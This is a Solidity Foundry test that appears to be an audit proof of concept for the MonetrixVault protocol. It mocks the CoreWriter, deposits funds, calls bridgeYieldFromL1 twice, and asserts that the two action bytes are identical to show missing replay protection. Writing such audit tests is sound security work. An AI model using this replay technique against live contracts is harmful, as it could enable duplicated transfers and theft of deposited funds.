// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "test/ActionEncoderBoundCheck.t.sol";
import "../src/core/MonetrixVault.sol";
import "../src/interfaces/HyperCoreConstants.sol";

// ATTACK TIMELINE:
// 1. [Setup] Harness deploys full protocol. We etch a MockCoreWriter at the CORE_WRITER address to intercept and record raw actions.
// 2. [T=0] Mock vault L1 spot USDC balance to max to allow bridging.
// 3. [T=1] Deposit 60,000 USDC as user1 to establish vault principal.
// 4. [T=6h] Warp time and perform keeperBridge to sync OLP (Outstanding L1 Principal).
// 5. [T=6h+1] Prime distributable surplus with 5,000 USDC profit to create yield shortfall.
// 6. [T=6h+2] Operator calls bridgeYieldFromL1(5000e6) -> CoreWriter receives action bytes (Call 1).
// 7. [T=6h+3] Operator calls bridgeYieldFromL1(5000e6) AGAIN -> CoreWriter receives IDENTICAL action bytes (Call 2).
// 8. [Assert] Verify CoreWriter received >= 2 actions and action[0] == action[1], proving missing replay protection / domain separation.

contract MockCoreWriter {
    bytes[] public actions;

    function sendRawAction(bytes calldata action) external {
        actions.push(action);
    }

    function getActionsCount() external view returns (uint256) {
        return actions.length;
    }
}

contract AuditAgentPoC is ToL1WeiHarness {
    function setUp() public {
        // Harness setUp deploys the full protocol
    }

    function test_exploit() public {
        // Step 1: Etch MockCoreWriter at the expected CoreWriter address
        MockCoreWriter spy = new MockCoreWriter();
        vm.etch(HyperCoreConstants.CORE_WRITER, address(spy).code);

        // Step 2: Mock vault L1 spot USDC balance
        _mockVaultL1SpotUsdc(type(uint64).max);

        // Step 3: Deposit to establish principal
        _depositAs(user1, 60_000e6);

        // Step 4: Warp and bridge to sync OLP
        vm.warp(block.timestamp + 6 hours);
        vm.prank(operator);
        vault.keeperBridge(MonetrixVault.BridgeTarget.Vault);

        // Step 5: Prime distributable yield
        _primeDistributable(5_000e6);

        // Step 6: First bridgeYieldFromL1 call
        vm.prank(operator);
        vault.bridgeYieldFromL1(5_000e6);

        uint256 count1 = spy.getActionsCount();
        console.log("Step 6: Actions count after 1st bridge =", count1);
        bytes memory action1 = spy.actions(count1 - 1);

        // Step 7: Replay the exact same bridgeYieldFromL1 call
        vm.prank(operator);
        vault.bridgeYieldFromL1(5_000e6);

        uint256 count2 = spy.getActionsCount();
        console.log("Step 7: Actions count after 2nd bridge =", count2);
        bytes memory action2 = spy.actions(count2 - 1);

        // Step 8: Assertions
        assertGe(count2, 2, "CoreWriter should have received at least 2 actions");
        assertEq(action1.length, action2.length, "Action lengths must match");

        // Prove the bytes are identical (no nonce, deadline, or chain ID domain separation)
        bool identical = true;
        for (uint i = 0; i < action1.length; i++) {
            if (action1[i] != action2[i]) {
                identical = false;
                break;
            }
        }
        assertTrue(identical, "Action bytes are identical - replay protection missing");
    }
}
